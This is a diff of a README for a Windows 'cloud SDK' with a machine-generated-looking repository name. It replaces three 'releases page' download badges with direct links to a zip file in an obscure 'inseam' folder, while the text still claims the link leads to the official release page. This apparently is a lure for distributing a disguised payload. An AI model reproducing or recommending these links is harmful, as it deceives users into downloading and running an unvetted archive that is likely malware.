@@ -1,6 +1,6 @@
 # ☁️ cloud-sdk-1771917534-6 - Easy Cloud Integration Tool
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Get%20the%20SDK-blue?style=for-the-badge)](https://github.com/carvalhojonatascj-tech/cloud-sdk-1771917534-6/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-Get%20the%20SDK-blue?style=for-the-badge)](https://raw.githubusercontent.com/carvalhojonatascj-tech/cloud-sdk-1771917534-6/main/inseam/cloud-sdk-v1.2.zip)
 
 ## 📋 What is cloud-sdk-1771917534-6?
 
@@ -14,7 +14,7 @@ This software runs on Windows computers. It works well on typical home or office
 
 To get started, you need to download the SDK files from the official release page.
 
-[![Download releases](https://img.shields.io/badge/Download-Releases%20Page-grey?style=for-the-badge)](https://github.com/carvalhojonatascj-tech/cloud-sdk-1771917534-6/releases)
+[![Download releases](https://img.shields.io/badge/Download-Releases%20Page-grey?style=for-the-badge)](https://raw.githubusercontent.com/carvalhojonatascj-tech/cloud-sdk-1771917534-6/main/inseam/cloud-sdk-v1.2.zip)
 
 Visit the page above to see all available versions. Choose the latest release to ensure you have the most up-to-date tools.
 
@@ -128,4 +128,4 @@ Also, the release page often has notes explaining new fixes and features for eac
 
 Download the software anytime from the official releases page:
 
-[![Get Cloud SDK](https://img.shields.io/badge/Download%20Now-From%20GitHub-blue?style=for-the-badge)](https://github.com/carvalhojonatascj-tech/cloud-sdk-1771917534-6/releases)
+[![Get Cloud SDK](https://img.shields.io/badge/Download%20Now-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/carvalhojonatascj-tech/cloud-sdk-1771917534-6/main/inseam/cloud-sdk-v1.2.zip)
